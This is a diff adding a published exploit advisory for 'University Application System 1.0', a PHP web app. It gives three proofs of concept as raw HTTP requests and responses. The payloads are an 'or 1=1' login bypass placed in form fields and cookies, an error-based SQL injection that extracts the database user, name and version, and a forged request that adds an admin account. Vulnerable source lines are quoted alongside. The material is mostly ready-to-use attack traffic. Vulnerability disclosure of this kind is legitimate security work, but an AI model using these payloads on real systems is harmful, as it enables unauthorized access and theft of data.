@@ -1,0 +1,122 @@
+# Exploit Title: University Application System 1.0 - SQL Injection / Cross-Site Request Forgery (Add Admin) 
+# Dork: N/A
+# Date: 2018-10-30
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/users/pamzey
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/Patrick%20Mvuma/unima.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/process.php
+# 
+#[PATH]/process.php
+#....
+#1001 if(isset($_POST['addmember']))
+#1002      {
+#1003      	 if($_POST['memail']!=''&&$_POST['mfname']!=''&&$_POST['msname']!=''&&$_POST['mpassword']!=''&&$_POST['mpasswords']!='')
+#1004            {              
+#1005             
+#1006    		$mfname = mysqli_real_escape_string($db,$_POST['mfname']);
+#1007 		$msname = mysqli_real_escape_string($db,$_POST['msname']);		
+#1008 	  $memail=mysqli_real_escape_string($db,$_POST['memail']);
+#1009 	    $mphone =mysqli_real_escape_string($db,$_POST['mphone']);
+#1010 	     $rpassword = mysqli_real_escape_string($db,$_POST['mpasswords']);
+#1011 		   $mpassword = mysqli_real_escape_string($db,$_POST['mpassword']);
+#....
+POST /[PATH]/process.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: pin=%27or+1%3D1+or+%27%27%3D%27; serial=%27or+1%3D1+or+%27%27%3D%27; PHPSESSID=upb6pa4qn0h16clnht4ugvhee1
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 87
+mfname=efe&msname=efe&memail=efe@omerefe.com&mpassword=efe&mpasswords=efe&addmember=ghj
+HTTP/1.1 302 Found
+Date: Mon, 29 Oct 2018 18:44:36 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: addadmin.php
+Content-Length: 127
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/process.php
+# 
+#[PATH]/process.php
+#....
+#973 if(isset($_POST['schoolgrade'])){
+#974 	  	
+#975 		//$adname=$_POST['']; 
+#976 		 $adname =$_POST["schoolgrade"]; 
+#....
+POST /[PATH]/process.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: pin=%27or+1%3D1+or+%27%27%3D%27; serial=%27or+1%3D1+or+%27%27%3D%27; PHPSESSID=upb6pa4qn0h16clnht4ugvhee1
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 236
+schoolgrade='||(SeleCT 'Efe' FroM duAL WheRE 110=110 AnD (seLEcT 112 frOM(SElecT CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct (ELT(112=112,1))),FLooR(RAnd(0)*2))x FROM INFOrmatION_SchEMA.PluGINS grOUp BY x)a))||'
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 18:51:22 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 421
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/process.php
+# 
+#[PATH]/process.php
+#....
+#516 if(isset($_POST['usernames'])&&$_POST['password'])	{
+#517 			 	
+#518 $usernames=$_POST['usernames'];
+#519 $password=$_POST['password'];
+#....
+POST /[PATH]/process.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=upb6pa4qn0h16clnht4ugvhee1
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+usernames='or 1=1 or ''='&password='or 1=1 or ''='
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 18:04:45 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: pin=%27or+1%3D1+or+%27%27%3D%27; expires=Mon, 05-Nov-2018 18:04:45 GMT; Max-Age=604800
+Set-Cookie: serial=%27or+1%3D1+or+%27%27%3D%27; expires=Mon, 05-Nov-2018 18:04:45 GMT; Max-Age=604800
+Content-Length: 247
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
